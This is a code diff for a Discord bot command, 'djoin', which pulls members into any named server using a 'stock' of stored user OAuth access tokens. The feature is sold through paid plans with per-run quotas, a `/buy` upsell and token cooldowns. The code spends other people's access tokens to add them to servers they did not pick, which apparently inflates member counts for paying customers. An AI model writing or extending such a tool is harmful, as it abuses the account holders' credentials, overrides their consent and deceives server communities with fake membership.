@@ -1,105 +1,86 @@
 const { SlashCommandBuilder } = require('@discordjs/builders');
 const { createEmbed } = require('../utils/embeds');
+const { COLORS } = require('../constants');
 const config = require('../config');
-const db = require('../database');
-const { readAuthData } = require('../services/oauthService');
+const cfg = require('../config/plans');
+const stock = require('../database/stock');
+const plans = require('../database/plans');
+const { batchJoin } = require('../services/joinService');
+const { logStaffAction } = require('../utils/staffLogger');
+
+const running = new Set();
 
 module.exports = {
   data: new SlashCommandBuilder()
     .setName('djoin')
-    .setDescription('Add authenticated users to a server using stored tokens')
-    .addStringOption((option) => option.setName('server').setDescription('Target server ID').setRequired(true)),
+    .setDescription('Pull stock members into a server')
+    .addStringOption((o) => o.setName('server').setDescription('Target server ID').setRequired(true))
+    .addIntegerOption((o) => o.setName('amount').setDescription('How many (default: max for plan)').setRequired(false)),
+
   async execute(interaction) {
-    try {
-      const serverId = interaction.options.getString('server');
-      if (!serverId) {
-        const embed = createEmbed({
-          title: 'Missing Server ID',
-          description: `Use /djoin <server_id> with a valid server ID.`,
-          color: 0xed4245,
-        });
-        return interaction.reply({ embeds: [embed], ephemeral: true });
-      }
+    const serverId = interaction.options.getString('server');
+    const guild = interaction.client.guilds.cache.get(serverId);
 
-      const plan = db.get(`plan_${interaction.user.id}`) || 'BRONZE';
-      const usage = db.get(`usage_${interaction.user.id}`) || 0;
-      const limit = config.PLAN_LIMITS[plan.toUpperCase()] || config.PLAN_LIMITS.BRONZE;
-      const remaining = limit - usage;
-
-      if (remaining <= 0) {
-        const embed = createEmbed({
-          title: 'Plan Limit Reached',
-          description: `Your current plan is **${plan}** and you have reached the maximum of **${limit}** joins.`,
-          color: 0xed4245,
-        });
-        return interaction.reply({ embeds: [embed], ephemeral: true });
-      }
-
-      const guild = interaction.client.guilds.cache.get(serverId);
-      if (!guild) {
-        const embed = createEmbed({
-          title: 'Bot Not In Server',
-          description: 'I am not currently in that server or the server ID is invalid.',
-          color: 0xed4245,
-        });
-        return interaction.reply({ embeds: [embed], ephemeral: true });
-      }
-
-      const authData = readAuthData().filter((entry) => typeof entry.access_token === 'string' && entry.access_token.length > 10);
-      if (authData.length === 0) {
-        const embed = createEmbed({
-          title: 'No Authenticated Users',
-          description: 'There are no stored authenticated users to add to the server.',
-          color: 0xed4245,
-        });
-        return interaction.reply({ embeds: [embed], ephemeral: true });
-      }
-
-      let added = 0;
-      let alreadyInServer = 0;
-      let failed = 0;
-
-      for (const entry of authData) {
-        if (added >= remaining) break;
-
-        const existingMember = await guild.members.fetch(entry.userID).catch(() => null);
-        if (existingMember) {
-          alreadyInServer += 1;
-          continue;
-        }
-
-        const userResolvable = entry.userID;
-        try {
-          await guild.members.add(userResolvable, { accessToken: entry.access_token });
-          added += 1;
-        } catch (error) {
-          failed += 1;
-        }
-      }
-
-      if (added > 0) {
-        db.set(`usage_${interaction.user.id}`, usage + added);
-      }
-
-      const embed = createEmbed({
-        title: 'Djoin Result',
-        description: `Server: **${guild.name}** (\`${guild.id}\`)
-Plan: **${plan}**
-Joined: **${added}**
-Already in server: **${alreadyInServer}**
-Failed: **${failed}**
-Remaining plan slots: **${Math.max(0, remaining - added)}**`,
-        color: added > 0 ? 0x43b581 : 0xed4245,
-      });
-      return interaction.reply({ embeds: [embed], ephemeral: true });
-    } catch (error) {
-      console.error(error);
-      const embed = createEmbed({
-        title: 'Execution Error',
-        description: 'Something went wrong while adding users to the server.',
-        color: 0xed4245,
-      });
-      return interaction.reply({ embeds: [embed], ephemeral: true });
+    if (!guild) {
+      return interaction.reply({ content: 'Bot is not in that server. Add the bot first.', ephemeral: true });
     }
+    if (running.has(serverId)) {
+      return interaction.reply({ content: 'A djoin is already running for this server.', ephemeral: true });
+    }
+
+    const plan = plans.getUser(interaction.user.id);
+    const tierName = plan?.config ? plan.tier : cfg.DEFAULT_TIER;
+    const maxPull = cfg.MAX_PULL_PER_RUN[tierName] || 3;
+
+    const gate = plans.consume(interaction.user.id, 0);
+    if (!gate.ok) {
+      const msg = {
+        no_plan: 'No active plan. Buy one with `/buy`.',
+        expired: 'Your plan expired. Renew with `/buy`.',
+        no_runs: 'You used all your runs for this plan.',
+        no_quota: 'Join quota finished.',
+      }[gate.reason];
+      return interaction.reply({ content: msg, ephemeral: true });
+    }
+
+    const requested = interaction.options.getInteger('amount') || maxPull;
+    const wanted = Math.min(requested, maxPull, plan ? plan.joinsLeft : maxPull);
+    const entries = stock.pick(wanted);
+
+    if (!entries.length) {
+      return interaction.reply({ content: 'Stock empty or all tokens on cooldown.', ephemeral: true });
+    }
+
+    running.add(serverId);
+    await interaction.reply({ embeds: [createEmbed({
+      title: 'Joining...',
+      description: `Pulling **${entries.length}** members into **${guild.name}**.`,
+      color: COLORS.primary,
+    })] });
+
+    let lastEdit = 0;
+    const result = await batchJoin(guild, entries, {
+      delay: (plan?.config?.cooldown ? 1200 : 1500),
+      onProgress: async (r) => {
+        if (Date.now() - lastEdit < 5000) return;
+        lastEdit = Date.now();
+        await interaction.editReply({ embeds: [createEmbed({
+          title: 'Joining...',
+          description: `Added **${r.added}** · Already **${r.already}** · Failed **${r.failed}**`,
+          color: COLORS.primary,
+        })] }).catch(() => null);
+      },
+    });
+
+    running.delete(serverId);
+    if (result.added) plans.consume(interaction.user.id, result.added);
+
+    await interaction.editReply({ embeds: [createEmbed({
+      title: result.added ? 'Done' : 'Nothing added',
+      description: `Server: **${guild.name}**\nAdded: **${result.added}**\nAlready there: ${result.already}\nFailed: ${result.failed}\nDead skipped: ${result.skipped}`,
+      color: result.added ? COLORS.success : COLORS.error,
+    })] });
+
+    await logStaffAction(interaction.client, 'djoin', `<@${interaction.user.id}> → \`${guild.id}\` · added ${result.added}`, COLORS.info);
   },
 };
